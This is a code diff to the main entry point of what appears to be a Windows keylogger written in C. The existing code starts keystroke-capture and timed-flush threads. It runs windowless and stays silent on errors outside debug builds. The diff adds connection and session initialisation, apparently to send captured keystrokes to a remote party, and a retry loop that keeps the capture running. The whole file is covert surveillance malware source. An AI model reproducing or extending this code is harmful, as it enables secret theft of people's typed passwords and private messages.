@@ -3,6 +3,7 @@
 #include "shared.h"
 #include "kbdHandler.h"
 #include "timer.h"
+#include "connection.h"
 
 #ifndef DEBUG
 int WinMain(
@@ -15,48 +16,58 @@ int WinMain(
 int main()
 #endif
 {
-    // Create Mutex for Synchronization on access to Buffer and Index in kbdDump and handleTimer threads
-    Mutex = CreateMutex(NULL, FALSE, NULL);
-    if (Mutex == NULL)
+    initSession();
+    initConnection();
+
+    while (TRUE)
     {
+        // Create Mutex for Synchronization on access to Buffer and Index in kbdDump and handleTimer threads
+        Mutex = CreateMutex(NULL, FALSE, NULL);
+        if (Mutex == NULL)
+        {
 #ifdef DEBUG
-        handleError("CreateMutex");
+            handleError("CreateMutex");
 #endif
-        return -1;
-    }
+            continue;
+        }
 
-    GetSystemTimeAsFileTime(&LastFlush);
+        GetSystemTimeAsFileTime(&LastFlush);
 
-    // Create kbdDump Thread
-    DWORD kbdDumpTID;
-    HANDLE kbdDumpT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kbdDump, 0, 0, &kbdDumpTID);
-    if (kbdDumpT == NULL)
-    {
+        // Create kbdDump Thread
+        DWORD kbdDumpTID;
+        HANDLE kbdDumpT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kbdDump, 0, 0, &kbdDumpTID);
+        if (kbdDumpT == NULL)
+        {
 #ifdef DEBUG
-        handleError("CreateThread");
+            handleError("CreateThread");
 #endif
-        return -1;
-    }
+            CloseHandle(Mutex);
+            continue;
+        }
 
-    // Create handleTimer Thread
-    DWORD handleTimerTID;
-    HANDLE handleTimerT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handleTimer, 0, 0, &handleTimerTID);
-    if (handleTimerT == NULL)
-    {
+        // Create handleTimer Thread
+        DWORD handleTimerTID;
+        HANDLE handleTimerT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handleTimer, 0, 0, &handleTimerTID);
+        if (handleTimerT == NULL)
+        {
 #ifdef DEBUG
-        handleError("CreateThread");
+            handleError("CreateThread");
 #endif
-        return -1;
+            TerminateThread(kbdDumpT, -1);
+            CloseHandle(kbdDumpT);
+            CloseHandle(Mutex);
+            continue;
+        }
+
+        // Wait for Threads to Finish
+        HANDLE threads[] = { handleTimerT, kbdDumpT };
+        WaitForMultipleObjects(2, threads, TRUE, INFINITE);
+
+        // Close Handles for Cleanup
+        CloseHandle(handleTimerT);
+        CloseHandle(kbdDumpT);
+        CloseHandle(Mutex);
+        break;
     }
-
-    // Wait for Threads to Finish
-    HANDLE threads[] = { handleTimerT, kbdDumpT };
-    WaitForMultipleObjects(2, threads, TRUE, INFINITE);
-
-    // Close Handles for Cleanup
-    CloseHandle(handleTimerT);
-    CloseHandle(kbdDumpT);
-    CloseHandle(Mutex);
-
     return 0;
 }
